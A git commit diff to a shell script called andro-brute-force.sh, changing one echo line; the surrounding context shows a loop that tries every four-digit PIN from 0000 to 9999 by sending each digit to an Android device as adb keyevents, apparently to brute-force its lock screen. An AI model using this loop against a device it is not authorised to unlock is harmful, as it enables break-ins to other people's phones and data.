4d26ec43cfd46140db966f7e85a7cfc34fef5097
Hack4peace <85699568+hack4peace@users.noreply.github.com>
2021-08-15 17:59:36 +0530

    Update andro-brute-force.sh

--- andro-brute-force.sh
+++ andro-brute-force.sh
@@ -43,7 +43,7 @@ echo -e "$grn---------------------------------------------------$rset"
 
 for i in {0000..9999}; do
 
-    echo -e "$red ATTEMPT $i$rset"
+    echo -e "$red $i$rset"
 	
     for (( j=0; j<${#i}; j++ )); do
         adb shell input keyevent $((`echo ${i:$j:1}`+7))
